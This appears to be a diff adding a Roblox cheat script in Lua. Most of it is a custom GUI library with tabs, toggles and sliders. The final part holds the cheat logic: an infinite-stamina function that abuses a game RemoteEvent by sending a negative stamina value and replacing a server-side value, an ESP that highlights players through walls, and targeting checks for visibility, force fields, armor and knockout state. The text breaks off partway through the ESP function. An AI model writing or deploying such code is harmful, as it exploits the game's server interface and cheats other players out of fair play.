+				for property, value in pairs(createInfo.Properties) do
+					instance[property] = value
+				end
+			end
+			--
+			return instance
+		end
+	end
+	--
+	function utility:Connection(connectionInfo)
+		local connectionInfo = connectionInfo or {}
+		--
+		if connectionInfo.Type then
+			local connection = connectionInfo.Type:Connect(connectionInfo.Callback or function() end)
+			--
+			obelus.connections[#obelus.connections] = connection
+			--
+			return connection
+		end
+	end
+	--
+	function utility:RemoveConnection(connectionInfo)
+		local connectionInfo = connectionInfo or {}
+		--
+		if connectionInfo.Connection then
+			local found = table.find(obelus.connections, connectionInfo.Connection)
+			--
+			if found then
+				connectionInfo.Connection:Disconnect()
+				--
+				table.remove(obelus.connections, found)
+			end
+		end
+	end
+end
+-- // Ui Functions
+do
+	function library:Window(windowInfo)
+		-- // Variables
+		local info = windowInfo or {}
+		local window = {Pages = {}, Dragging = false, Delta = UDim2.new(), Delta2 = Vector3.new()}
+		-- // Utilisation
+		local screen = utility:Create({Type = "ScreenGui", Properties = {
+			Parent = cre,
+			DisplayOrder = 8888,
+			IgnoreGuiInset = true,
+			Name = "obleus",
+			ZIndexBehavior = "Global",
+			ResetOnSpawn = false
+		}})
+
+		game:GetService("UserInputService").InputBegan:Connect(function(k,g)
+			if not g then 
+				if k.KeyCode == Enum.KeyCode.RightAlt then 
+					screen.Enabled = not screen.Enabled 
+				end
+			end
+		end)
+		--
+		local main = utility:Create({Type = "Frame", Properties = {
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			BackgroundColor3 = Color3.fromRGB(51, 51, 51),
+			BorderColor3 = Color3.fromRGB(0, 0, 0),
+			BorderMode = "Inset",
+			BorderSizePixel = 1,
+			Parent = screen,
+			Position = UDim2.new(0.5, 0, 0.5, 0),
+			Size = UDim2.new(0, 516, 0, 563)
+		}})
+		--
+		local frame = utility:Create({Type = "Frame", Properties = {
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			BackgroundColor3 = Color3.fromRGB(12, 12, 12),
+			BorderSizePixel = 0,
+			Parent = main,
+			Position = UDim2.new(0.5, 0, 0.5, 0),
+			Size = UDim2.new(1, -2, 1, -2),
+		}})
+
+		--
+		local draggingButton = utility:Create({Type = "TextButton", Properties = {
+			BackgroundTransparency = 1,
+			BorderSizePixel = 0,
+			Parent = frame,
+			Position = UDim2.new(0, 0, 0, 0),
+			Size = UDim2.new(1, 0, 0, 24),
+			Text = ""
+		}})
+		--
+		local title = utility:Create({Type = "TextLabel", Properties = {
+			BackgroundTransparency = 1,
+			BorderSizePixel = 0,
+			Parent = frame,
+			Position = UDim2.new(0, 9, 0, 6),
+			Size = UDim2.new(1, -16, 0, 15),
+			Font = "Code",
+			RichText = true,
+			Text = info.Name or info.name or "obleus",
+			TextColor3 = Color3.fromRGB(142, 142, 142),
+			TextStrokeTransparency = 0.5,
+			TextSize = 13,
+			TextXAlignment = "Left"
+		}})
+		--
+		local accent = utility:Create({Type = "Frame", Properties = {
+			BackgroundTransparency = 1,
+			BorderSizePixel = 0,
+			Parent = frame,
+			Position = UDim2.new(0, 8, 0, 22),
+			Size = UDim2.new(1, -16, 0, 2)
+		}})
+		--
+		local accentFirst = utility:Create({Type = "Frame", Properties = {
+			BackgroundColor3 = Color3.fromRGB(170, 85, 235),
+			BorderSizePixel = 0,
+			Parent = accent,
+			Position = UDim2.new(0, 0, 0, 0),
+			Size = UDim2.new(1, 0, 0, 1)
+		}})
+		--
+		local accentSecond = utility:Create({Type = "Frame", Properties = {
+			BackgroundColor3 = Color3.fromRGB(101, 51, 141),
+			BorderSizePixel = 0,
+			Parent = accent,
+			Position = UDim2.new(0, 0, 0, 1),
+			Size = UDim2.new(1, 0, 0, 1)
+		}})
+		--
+		local tabs = utility:Create({Type = "Frame", Properties = {
+			BackgroundColor3 = Color3.fromRGB(1, 1, 1),
+			BorderSizePixel = 0,
+			Parent = frame,
+			Position = UDim2.new(0, 8, 0, 29),
+			Size = UDim2.new(1, -16, 0, 30)
+		}})
+		--
+		local tabsInline = utility:Create({Type = "Frame", Properties = {
+			BackgroundColor3 = Color3.fromRGB(1, 1, 1),
+			BorderSizePixel = 0,
+			Parent = tabs,
+			Position = UDim2.new(0, 0, 0, 0),
+			Size = UDim2.new(1, -1, 1, 0)
+		}})
+		--
+		utility:Create({Type = "UIListLayout", Properties = {
+			Padding = UDim.new(0, 0),
+			Parent = tabsInline,
+			FillDirection = "Horizontal"
+		}})
+		--
+		local pagesHolder = utility:Create({Type = "Frame", Properties = {
+			BackgroundColor3 = Color3.fromRGB(51, 51, 51),
+			BorderColor3 = Color3.fromRGB(0, 0, 0),
+			BorderMode = "Inset",
+			BorderSizePixel = 1,
+			Parent = frame,
+			Position = UDim2.new(0, 8, 0, 65),
+			Size = UDim2.new(1, -16, 1, -76)
+		}})
+		--
+		local pagesFrame = utility:Create({Type = "Frame", Properties = {
+			BackgroundColor3 = Color3.fromRGB(13, 13, 13),
+			BorderSizePixel = 0,
+			Parent = pagesHolder,
+			Position = UDim2.new(0, 1, 0, 1),
+			Size = UDim2.new(1, -2, 1, -2)
+		}})
+		--
+		local pagesFolder = utility:Create({Type = "Folder", Properties = {
+			Parent = pagesFrame
+		}})
+		-- // Functions / Connections
+		local connection = utility:Connection({Type = draggingButton.InputBegan, Callback = function(Input)
+			if not window.Dragging and Input.UserInputType == Enum.UserInputType.MouseButton1 then
+				window.Dragging = true
+				window.Delta = main.Position
+				window.Delta2 = Input.Position
+			end
+		end})
+		--
+		local connection2 = utility:Connection({Type = uis.InputEnded, Callback = function(Input)
+			if window.Dragging and Input.UserInputType == Enum.UserInputType.MouseButton1 then
+				window.Dragging = false
+				window.Delta = UDim2.new()
+				window.Delta2 = Vector3.new()
+			end
+		end})
+		--
+		local connection3 = utility:Connection({Type = uis.InputChanged, Callback = function(Input)
+			if window.Dragging then
+				local Delta = Input.Position - window.Delta2
+				main.Position = UDim2.new(window.Delta.X.Scale, window.Delta.X.Offset + Delta.X, window.Delta.Y.Scale, window.Delta.Y.Offset + Delta.Y)
+			end
+		end})
+		-- // Nested Functions
+		function window:RefreshTabs()
+			for index, page in pairs(window.Pages) do
+				page.Tab.Size = UDim2.new(1 / (#window.Pages), 0, 1, 0)
+			end
+		end
+		--
+		function window:Page(pageInfo)
+			-- // Variables
+			local info = pageInfo or {}
+			local page = {Open = false}
+			-- // Utilisation
+			local tab = utility:Create({Type = "Frame", Properties = {
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				Parent = tabsInline,
+				Size = UDim2.new(1, 0, 1, 0)
+			}})
+			--
+			local tabButton = utility:Create({Type = "TextButton", Properties = {
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				Parent = tab,
+				Position = UDim2.new(0, 0, 0, 0),
+				Size = UDim2.new(1, 0, 1, 0)
+			}})
+			--
+			local tabInline = utility:Create({Type = "Frame", Properties = {
+				BackgroundColor3 = Color3.fromRGB(41, 41, 41),
+				BorderSizePixel = 0,
+				Parent = tab,
+				Position = UDim2.new(0, 1, 0, 1),
+				Size = UDim2.new(1, -1, 1, -2)
+			}})
+			--
+			local tabInlineGradient = utility:Create({Type = "Frame", Properties = {
+				BackgroundColor3 = Color3.fromRGB(41, 41, 41),
+				BorderSizePixel = 0,
+				Parent = tabInline,
+				Position = UDim2.new(0, 1, 0, 1),
+				Size = UDim2.new(1, -2, 1, -2)
+			}})
+			--
+			local tabGradient = utility:Create({Type = "UIGradient", Properties = {
+				Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 100))}),
+				Rotation = 90,
+				Parent = tabInlineGradient
+			}})
+			--
+			local tabTitle = utility:Create({Type = "TextLabel", Properties = {
+				AnchorPoint = Vector2.new(0, 0.5),
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				Parent = tabInlineGradient,
+				Position = UDim2.new(0, 4, 0.5, 0),
+				Size = UDim2.new(1, -8, 0, 15),
+				Font = "Code",
+				RichText = true,
+				Text = info.Name or info.name or "tab",
+				TextColor3 = Color3.fromRGB(142, 142, 142),
+				TextStrokeTransparency = 0.5,
+				TextSize = 13,
+				TextXAlignment = "Center"
+			}})
+			--
+			local pageHolder = utility:Create({Type = "Frame", Properties = {
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				Parent = pagesFolder,
+				Position = UDim2.new(0, 10, 0, 10),
+				Size = UDim2.new(1, -20, 1, -20),
+				Visible = false
+			}})
+			--
+			local leftHolder = utility:Create({Type = "Frame", Properties = {
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				Parent = pageHolder,
+				Position = UDim2.new(0, 0, 0 ,0),
+				Size = UDim2.new(0.5, -5, 1, 0)
+			}})
+			--
+			local rightHolder = utility:Create({Type = "Frame", Properties = {
+				AnchorPoint = Vector2.new(1, 0),
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				Parent = pageHolder,
+				Position = UDim2.new(1, 0, 0 ,0),
+				Size = UDim2.new(0.5, -5, 1, 0)
+			}})
+			-- // Functions / Connections
+			utility:Connection({Type = tabButton.MouseButton1Down, Callback = function()
+				if not page.open then
+					for index, other_page in pairs(window.Pages) do
+						if other_page ~= page then
+							other_page:Turn(false)
+						end
+					end
+				end
+				--
+				page:Turn(true)
+			end})
+			-- // Nested Functions
+			function page:Turn(state)
+				tabTitle.TextColor3 = state and Color3.fromRGB(170, 85, 235) or Color3.fromRGB(142, 142, 142)
+				tabGradient.Color = state and ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(155, 155, 155))}) or ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 100))})
+				--
+				page.PageHolder.Visible = state
+				page.Open = state
+			end
+			--
+			function page:Section(sectionInfo)
+				-- // Variables
+				local info = sectionInfo or {}
+				local section = {}
+				-- // Utilisation
+				local sectionMain = utility:Create({Type = "Frame", Properties = {
+					BackgroundColor3 = Color3.fromRGB(45, 45, 45),
+					BorderColor3 = Color3.fromRGB(13, 13, 13),
+					BorderMode = "Inset",
+					BorderSizePixel = 1,
+					Parent = page[((info.Side and info.Side:lower() == "right") or (info.side and info.side:lower() == "right")) and "Right" or "Left"],
+					Position = UDim2.new(0, 0, 0, 0),
+					Size = UDim2.new(1, 0, 0, (info.Size or info.size or 200) + 4)
+				}})
+				--
+				local sectionFrame = utility:Create({Type = "Frame", Properties = {
+					BackgroundColor3 = Color3.fromRGB(19, 19, 19),
+					BorderSizePixel = 0,
+					Parent = sectionMain,
+					Position = UDim2.new(0, 1, 0, 1),
+					Size = UDim2.new(1, -2, 1, -2)
+				}})
+				--
+				local sectionTitle = utility:Create({Type = "TextLabel", Properties = {
+					AnchorPoint = Vector2.new(0, 0.5),
+					BackgroundTransparency = 1,
+					BorderSizePixel = 0,
+					Parent = sectionMain,
+					Position = UDim2.new(0, 13, 0, 0),
+					Size = UDim2.new(1, -26, 0, 15),
+					Font = "Code",
+					RichText = true,
+					Text = info.Name or info.name or "new section",
+					TextColor3 = Color3.fromRGB(205, 205, 205),
+					TextStrokeTransparency = 0.5,
+					TextSize = 13,
+					TextXAlignment = "Left",
+					ZIndex = 2
+				}})
+				--
+				local sectionTitleLine = utility:Create({Type = "Frame", Properties = {
+					BackgroundColor3 = Color3.fromRGB(19, 19, 19),
+					BorderSizePixel = 0,
+					Parent = sectionMain,
+					Position = UDim2.new(0, 9, 0, 0),
+					Size = UDim2.new(0, sectionTitle.TextBounds.X + 6, 0, 1)
+				}})
+				--
+				local sectionScrolling = utility:Create({Type = "Frame", Properties = {
+					BackgroundTransparency = 1,
+					BorderSizePixel = 0,
+					Parent = sectionMain,
+					Position = UDim2.new(0, 1, 0, 1),
+					Size = UDim2.new(1, -2, 1, -2),
+					Visible = false
+				}})
+				--
+				local sectionScrollingBar = utility:Create({Type = "Frame", Properties = {
+					AnchorPoint = Vector2.new(1, 0),
+					BackgroundColor3 = Color3.fromRGB(45, 45, 45),
+					BorderSizePixel = 0,
+					Parent = sectionScrolling,
+					Position = UDim2.new(1, 0, 0, 0),
+					Size = UDim2.new(0, 5, 1, 0),
+					ZIndex = 3
+				}})
+				--
+				local sectionScrollingGradient = utility:Create({Type = "ImageLabel", Properties = {
+					AnchorPoint = Vector2.new(0, 1),
+					BackgroundTransparency = 1,
+					BorderSizePixel = 0,
+					Parent = sectionScrolling,
+					Position = UDim2.new(0, 0, 1, 0),
+					Size = UDim2.new(1, 0, 0, 20),
+					ZIndex = 2,
+					Image = "rbxassetid://7783533907",
+					ImageTransparency = 0,
+					ImageColor3 = Color3.fromRGB(19, 19, 19),
+					ScaleType = "Stretch"
+				}})
+				--
+				local sectionContentHolder = utility:Create({Type = "ScrollingFrame", Properties = {
+					BackgroundTransparency = 1,
+					BorderSizePixel = 0,
+					Parent = sectionFrame,
+					Position = UDim2.new(0, 0, 0, 0),
+					Size = UDim2.new(1, 0, 1, 0),
+					ZIndex = 4,
+					AutomaticCanvasSize = "Y",
+					BottomImage = "rbxassetid://7783554086",
+					CanvasSize = UDim2.new(0, 0, 0, 0),
+					MidImage = "rbxassetid://7783554086",
+					ScrollBarImageColor3 = Color3.fromRGB(65, 65, 65),
+					ScrollBarThickness = 4,
+					TopImage = "rbxassetid://7783554086",
+					VerticalScrollBarInset = "ScrollBar"
+				}})
+				--
+				utility:Create({Type = "UIListLayout", Properties = {
+					Padding = UDim.new(0, 5),
+					Parent = sectionContentHolder,
+					FillDirection = "Vertical"
+				}})
+				--
+				local sectionInline = utility:Create({Type = "Frame", Properties = {
+					BackgroundColor3 = Color3.fromRGB(19, 19, 19),
+					BorderSizePixel = 0,
+					Parent = sectionContentHolder,
+					Position = UDim2.new(0, 1, 0, 1),
+					Size = UDim2.new(1, 0, 0, 10)
+				}})
+				-- // Functions / Connections
+				-- // Nested Functions
+				function section:Update()
+					if sectionContentHolder.AbsoluteCanvasSize.Y > ((info.Size or info.size or 200) + 4) then
+						sectionScrolling.Visible = true
+					else
+						sectionScrolling.Visible = false
+					end
+				end
+				--
+				function section:Label(labelInfo)
+					-- // Variables
+					local info = labelInfo or {}
+					local label = {}
+					-- // Utilisation
+					local contentHolder = utility:Create({Type = "Frame", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = sectionContentHolder,
+						Size = UDim2.new(1, 0, 0, 14)
+					}})
+					--
+					local labelTitle = utility:Create({Type = "TextLabel", Properties = {
+						AnchorPoint = Vector2.new(0, 0),
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Size = UDim2.new(1, -(info.Offset or 36), 1, 0),
+						Position = UDim2.new(0, info.Offset or 36, 0, 0),
+						Font = "Code",
+						RichText = true,
+						Text = info.Name or info.name or info.Text or info.text or "new label",
+						TextColor3 = Color3.fromRGB(180, 180, 180),
+						TextStrokeTransparency = 0.5,
+						TextSize = 13,
+						TextXAlignment = "Left"
+					}})
+					-- // Functions / Connections
+					-- // Nested Functions
+					function label:Remove()
+						contentHolder:Remove()
+						label = nil
+						--
+						section:Update()
+					end
+					-- // Returning + Other
+					section:Update()
+					--
+					return label
+				end
+				--
+				function section:Toggle(toggleInfo)
+					-- // Variables
+					local info = toggleInfo or {}
+					local toggle = {
+						state = (info.Default or info.default or info.Def or info.def or false),
+						callback = (info.Callback or info.callback or function() end)
+					}
+					-- // Utilisation
+					local contentHolder = utility:Create({Type = "Frame", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = sectionContentHolder,
+						Size = UDim2.new(1, 0, 0, 14)
+					}})
+					--
+					local toggleButton = utility:Create({Type = "TextButton", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Position = UDim2.new(0, 0, 0, 0),
+						Size = UDim2.new(1, 0, 1, 0),
+						Text = ""
+					}})
+					--
+					local toggleTitle = utility:Create({Type = "TextLabel", Properties = {
+						AnchorPoint = Vector2.new(0, 0),
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Size = UDim2.new(1, -36, 1, 0),
+						Position = UDim2.new(0, 36, 0, 0),
+						Font = "Code",
+						RichText = true,
+						Text = info.Name or info.name or info.Text or info.text or "new toggle",
+						TextColor3 = Color3.fromRGB(180, 180, 180),
+						TextStrokeTransparency = 0.5,
+						TextSize = 13,
+						TextXAlignment = "Left"
+					}})
+					--
+					local toggleFrame = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = Color3.fromRGB(1, 1, 1),
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Position = UDim2.new(0, 16, 0, 2),
+						Size = UDim2.new(0, 10, 0, 10)
+					}})
+					--
+					local toggleInlineGradient = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = toggle.state and Color3.fromRGB(170, 85, 235) or Color3.fromRGB(63, 63, 63),
+						BorderSizePixel = 0,
+						Parent = toggleFrame,
+						Position = UDim2.new(0, 1, 0, 1),
+						Size = UDim2.new(1, -2, 1, -2)
+					}})
+					--
+					local toggleGradient = utility:Create({Type = "UIGradient", Properties = {
+						Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(125, 125, 125))}),
+						Rotation = 90,
+						Parent = toggleInlineGradient
+					}})
+					-- // Functions / Connections
+					local connection = utility:Connection({Type = toggleButton.MouseButton1Down, Callback = function()
+						toggle.state = not toggle.state
+						toggleInlineGradient.BackgroundColor3 = toggle.state and Color3.fromRGB(170, 85, 235) or Color3.fromRGB(63, 63, 63)
+						toggle.callback(toggle.state)
+					end})
+					-- // Nested Functions
+					function toggle:Remove()
+						contentHolder:Remove()
+						toggle = nil
+						--
+						utility:RemoveConnection({Connection = connection})
+						connection = nil
+						--
+						section:Update()
+					end
+					--
+					function toggle:Get()
+						return toggle.state
+					end
+					--
+					function toggle:Set(value)
+						if typeof(value) == "boolean" then
+							toggle.state = value
+
+							if toggle.state == true then
+								toggleInlineGradient.BackgroundColor3 = Color3.fromRGB(170, 85, 235)
+							else
+								toggleInlineGradient.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
+							end
+						end
+					end
+					-- // Returning + Other
+					section:Update()
+					--
+					return toggle
+				end
+				--
+				function section:Button(buttonInfo)
+					-- // Variables
+					local info = buttonInfo or {}
+					local button = {
+						callback = (info.Callback or info.callback or function() end)
+					}
+					-- // Utilisation
+					local contentHolder = utility:Create({Type = "Frame", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = sectionContentHolder,
+						Size = UDim2.new(1, 0, 0, 20)
+					}})
+					--
+					local buttonButton = utility:Create({Type = "TextButton", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Position = UDim2.new(0, 0, 0, 0),
+						Size = UDim2.new(1, 0, 1, 0),
+						Text = ""
+					}})
+					--
+					local buttonFrame = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = Color3.fromRGB(45, 45, 45),
+						BorderColor3 = Color3.fromRGB(1, 1, 1),
+						BorderMode = "Inset",
+						BorderSizePixel = 1,
+						Parent = contentHolder,
+						Position = UDim2.new(0, 16, 0, 0),
+						Size = UDim2.new(1, -32, 1, 0)
+					}})
+					--
+					local buttonInline = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = Color3.fromRGB(25, 25, 25),
+						BorderSizePixel = 0,
+						Parent = buttonFrame,
+						Position = UDim2.new(0, 1, 0, 1),
+						Size = UDim2.new(1, -2, 1, -2)
+					}})
+					--
+					local buttonTitle = utility:Create({Type = "TextLabel", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Size = UDim2.new(1, -32, 1, 0),
+						Position = UDim2.new(0, 16, 0, 0),
+						Font = "Code",
+						RichText = true,
+						Text = info.Name or info.name or info.Text or info.text or "new button",
+						TextColor3 = Color3.fromRGB(180, 180, 180),
+						TextStrokeTransparency = 0.5,
+						TextSize = 13,
+						TextXAlignment = "Center"
+					}})
+					--
+					-- // Functions / Connections
+					local connection = utility:Connection({Type = buttonButton.MouseButton1Down, Callback = function()
+						button.callback()
+					end})
+					-- // Nested Functions
+					function button:Remove()
+						contentHolder:Remove()
+						button = nil
+						--
+						utility:RemoveConnection({Connection = connection})
+						connection = nil
+						--
+						section:Update()
+					end
+					-- // Returning + Other
+					section:Update()
+					--
+					return button
+				end
+				--
+				function section:Slider(sliderInfo)
+					-- // Variables
+					local info = sliderInfo or {}
+					local slider = {
+						state = (info.Default or info.default or info.Def or info.def or 0),
+						min = (info.Minimum or info.minimum or info.Min or info.min or 0),
+						max = (info.Maximum or info.maximum or info.Max or info.max or 10),
+						decimals = (1 / (info.Decimals or info.decimals or info.Tick or info.tick or 0.25)),
+						suffix = (info.Suffix or info.suffix or info.Ending or info.ending or ""),
+						callback = (info.Callback or info.callback or function() end),
+						holding = false
+					}
+					-- // Utilisation
+					local contentHolder = utility:Create({Type = "Frame", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = sectionContentHolder,
+						Size = UDim2.new(1, 0, 0, (info.Name or info.name or info.Text or info.text) and 24 or 10)
+					}})
+					--
+					local sliderButton = utility:Create({Type = "TextButton", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Position = UDim2.new(0, 0, 0, 0),
+						Size = UDim2.new(1, 0, 1, 0),
+						Text = ""
+					}})
+					--
+					if (info.Name or info.name or info.Text or info.text) then
+						local sliderTitle = utility:Create({Type = "TextLabel", Properties = {
+							AnchorPoint = Vector2.new(0, 0),
+							BackgroundTransparency = 1,
+							BorderSizePixel = 0,
+							Parent = contentHolder,
+							Size = UDim2.new(1, -16, 0, 14),
+							Position = UDim2.new(0, 16, 0, 0),
+							Font = "Code",
+							RichText = true,
+							Text = (info.Name or info.name or info.Text or info.text),
+							TextColor3 = Color3.fromRGB(180, 180, 180),
+							TextStrokeTransparency = 0.5,
+							TextSize = 13,
+							TextXAlignment = "Left"
+						}})
+					end
+					--
+					local sliderFrame = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = Color3.fromRGB(1, 1, 1),
+						BorderSizePixel = 0,
+						Parent = contentHolder,
+						Position = UDim2.new(0, 16, 0, (info.Name or info.name or info.Text or info.text) and 14 or 0),
+						Size = UDim2.new(1, -32, 0, 10)
+					}})
+					--
+					local sliderInlineGradient = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = Color3.fromRGB(63, 63, 63),
+						BorderSizePixel = 0,
+						Parent = sliderFrame,
+						Position = UDim2.new(0, 1, 0, 1),
+						Size = UDim2.new(1, -2, 1, -2)
+					}})
+					--
+					local sliderGradient = utility:Create({Type = "UIGradient", Properties = {
+						Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(125, 125, 125))}),
+						Rotation = 90,
+						Parent = sliderInlineGradient
+					}})
+					--
+					local sliderSlideHolder = utility:Create({Type = "Frame", Properties = {
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = sliderFrame,
+						Position = UDim2.new(0, 1, 0, 1),
+						Size = UDim2.new(1, -2, 1, -2)
+					}})
+					--
+					local sliderSlide = utility:Create({Type = "Frame", Properties = {
+						BackgroundColor3 = Color3.fromRGB(170, 85, 235),
+						BorderSizePixel = 0,
+						Parent = sliderSlideHolder,
+						Position = UDim2.new(0, 0, 0, 0),
+						Size = UDim2.new(0.5, 0, 1, 0)
+					}})
+					--
+					local sliderGradient = utility:Create({Type = "UIGradient", Properties = {
+						Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(125, 125, 125))}),
+						Rotation = 90,
+						Parent = sliderSlide
+					}})
+					--
+					local sliderValue = utility:Create({Type = "TextLabel", Properties = {
+						AnchorPoint = Vector2.new(0.5, 0.25),
+						BackgroundTransparency = 1,
+						BorderSizePixel = 0,
+						Parent = sliderSlide,
+						Size = UDim2.new(0, 10, 0, 14),
+						Position = UDim2.new(1, 0, 0.5, 0),
+						Font = "Code",
+						RichText = true,
+						Text = tostring(slider.state) .. tostring(slider.suffix),
+						TextColor3 = Color3.fromRGB(180, 180, 180),
+						TextStrokeTransparency = 0.5,
+						TextSize = 13,
+						TextXAlignment = "Left"
+					}})
+					-- // Functions / Connections
+					local connection = utility:Connection({Type = sliderButton.MouseButton1Down, Callback = function()
+						slider.holding = true
+						slider:Refresh()
+					end})
+					--
+					local connection2 = utility:Connection({Type = uis.InputEnded, Callback = function()
+						slider.holding = false
+					end})
+					--
+					local connection3 = utility:Connection({Type = uis.InputChanged, Callback = function()
+						if slider.holding then
+							slider:Refresh()
+						end
+					end})
+					-- // Nested Functions
+					function slider:Remove()
+						contentHolder:Remove()
+						slider = nil
+						--
+						utility:RemoveConnection({Connection = connection})
+						connection = nil
+						utility:RemoveConnection({Connection = connection2})
+						connection2 = nil
+						utility:RemoveConnection({Connection = connection3})
+						connection3 = nil
+						--
+						section:Update()
+					end
+					--
+					function slider:Get()
+						return slider.state
+					end
+					--
+					function slider:Set(value)
+						slider.state = math.clamp(math.round(value * slider.decimals) / slider.decimals, slider.min, slider.max)
+						sliderSlide.Size = UDim2.new(1 - ((slider.max - slider.state) / (slider.max - slider.min)), 0, 1, 0)
+						sliderValue.Text = tostring(slider.state) .. tostring(slider.suffix)
+						pcall(slider.callback, slider.state)
+					end
+					--
+					function slider:Refresh()
+						if slider.holding then
+							local mouseLocation = uis:GetMouseLocation()
+							slider:Set(math.clamp(math.floor((slider.min + (slider.max - slider.min) * (math.clamp(mouseLocation.X - sliderSlide.AbsolutePosition.X, 0, sliderSlideHolder.AbsoluteSize.X) / sliderSlideHolder.AbsoluteSize.X)) * slider.decimals) / slider.decimals, slider.min, slider.max))
+						end
+					end
+					-- // Returning + Other
+					section:Update()
+					slider:Set(slider.state)
+					--
+					return slider
+				end
+				-- // Returning + Other
+				return section
+			end
+			-- // Returning + Other
+			page.Tab = tab
+			page.PageHolder = pageHolder
+			page.Left = leftHolder
+			page.Right = rightHolder
+			--
+			window.Pages[#window.Pages + 1] = page
+			window:RefreshTabs()
+			--
+			return page
+		end
+		-- // Returning
+		return window
+	end
+end
+-- // Main
+
+local function isTargetOnScreen(targetPlayer : Player)
+	local targetCharacter = targetPlayer.Character
+	if not targetCharacter or not targetCharacter:FindFirstChild("HumanoidRootPart") then
+		return false 
+	end
+
+	local targetPos, onScreen = Camera:WorldToViewportPoint(targetCharacter.HumanoidRootPart.Position)
+
+	if not onScreen then
+		return false
+	end
+
+	local rayOrigin = Camera.CFrame.Position
+	local direction = (targetCharacter.HumanoidRootPart.Position - rayOrigin).Unit
+	local ray = Ray.new(rayOrigin, direction * 1000) 
+	local hitPart = workspace:FindPartOnRayWithIgnoreList(ray, {Camera, LocalPlayer.Character})
+
+	if hitPart and hitPart:IsDescendantOf(targetCharacter) then
+		return true 
+	else
+		return false 
+	end
+end
+
+local function ForceFieldCheck(targetPlayer : Player)
+	local targetCharacter = targetPlayer.Character
+
+	if targetPlayer.Character:FindFirstChildOfClass("ForceField") then
+		return true
+	else
+		return false
+	end
+end
+
+function Inf()
+	if Flags["InfiniteStamina"] then
+		ReplicatedStorage.Touch1:FireServer({
+			Handle = {Swing = workspace.OneHoop.Score.Sound},
+			Info = {
+				Stam = {Value = -(Value or math.huge)},
+				Range = {Value = 0}
+			}
+		}, 0, false, 0)
+
+
+		LocalPlayer.Backpack:FindFirstChild("ServerTraits").Stann:Destroy()
+
+		local i = INew("IntValue")
+		i.Name = "Stann"
+		i.Parent = LocalPlayer.Backpack:FindFirstChild("ServerTraits")
+		i.Value = 100
+	else
+		return;
+	end
+end
+
+
+local function vested(player : Player)
+	if player.Character:FindFirstChild("BulletResist") then
+		return true
+	else
+		return false
+	end
+end
+
+local function KOed(player : Player) 
+	if player.Character:FindFirstChild("KO") or player.Character:FindFirstChildOfClass("Humanoid").Health == 0 then
+		return true
+	else
+		return false
+	end
+end
+
+local function esp(player)
+
+	if not _OT["ESP"] then
+		for i, v in ipairs(Players:GetPlayers()) do
+			if v.Character and v.Character:FindFirstChild("Head") then
+				local head, char = v.Character.Head, v.Character
+				if head:FindFirstChild("wl") and char:FindFirstChild("ohkay") then
+					head:FindFirstChild("wl"):Destroy();
+					char:FindFirstChild("ohkay"):Destroy();
+					return
+				end
+			end
+		end
+	end
+
+	local bgui = INew('BillboardGui')
+	local tlab = INew('TextLabel', bgui)
+	local highlight = INew("Highlight")
+
+	highlight.Name = "ohkay"
+	highlight.FillTransparency = 0.7
+	highlight.OutlineTransparency = 0
+	highlight.FillColor = Color3.fromRGB(170, 85, 235) 
+	highlight.OutlineColor = Color3.fromRGB(255, 255, 255) 
+
+	bgui.Name = "wl"
+	bgui.Adornee = Players[player].Character:FindFirstChild("Head")
+	bgui.AlwaysOnTop = true
+	bgui.ExtentsOffset = V3New(0, 1, 0)
+	bgui.Size = UDim2.new(0, 5, 0, 5)
+
+	tlab.Name = "wl"
+	tlab.BackgroundColor3 = Color3.new(1, 1, 1)
+	tlab.BackgroundTransparency = 1
+	tlab.BorderSizePixel = 0
+	tlab.Position = UDim2.new(0, 0, 0, -40)
+	tlab.Size = UDim2.new(1, 0, 10, 0)
+	tlab.Visible = true
+	tlab.ZIndex = 10
+	tlab.Font = Enum.Font.ArialBold
+	tlab.TextSize = 14
+	tlab.Text = ""
